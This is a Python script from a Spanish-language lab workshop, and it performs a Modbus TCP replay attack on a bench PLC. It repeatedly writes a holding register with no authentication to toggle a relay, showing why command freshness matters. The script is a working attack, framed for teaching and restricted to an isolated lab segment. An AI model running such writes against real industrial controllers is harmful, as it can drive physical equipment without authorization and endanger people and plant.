#!/usr/bin/env python3
"""Taller U6 - Parte II (Listado U6.4): REPLAY de un mando Modbus TCP. SOLO contra el PLC
de TU banco (192.168.1.10), en el segmento aislado del laboratorio. Lanzarlo contra
cualquier otro equipo o red es un acceso no autorizado (lee la seccion de etica).

Demuestra que, SIN frescura ni autenticacion, el servidor Modbus TCP no distingue un mando
legitimo de su repeticion: no hay que descifrar nada, basta reemitir la misma escritura.
La defensa (Parte II) es la frescura de frescura.py, no el cifrado.

    python3 atacante_replay.py            # reinyecta FC6 [4]=1 / [4]=0 cinco veces
"""
import sys
import time

from pymodbus.client import ModbusTcpClient

PLC = "192.168.1.10"            # victima: TU PLC, sin auth ni frescura


def main():
    cli = ModbusTcpClient(PLC, port=502, timeout=1.0)
    if not cli.connect():
        print("no conecta a %s:502 (¿esta el servidor Modbus TCP de la L7 corriendo?)" % PLC)
        sys.exit(1)
    print("conectado a %s:502 sin que nadie pida credenciales" % PLC)
    for _ in range(5):
        cli.write_register(4, 1, slave=1)           # FC6 [4]=1 -> el rele cierra
        time.sleep(0.4)
        cli.write_register(4, 0, slave=1)           # FC6 [4]=0 -> el rele abre
        time.sleep(0.4)
    print("replay ejecutado: el rele repiquetea; el servidor no lo distingue de un mando real")
    cli.close()


if __name__ == "__main__":
    main()
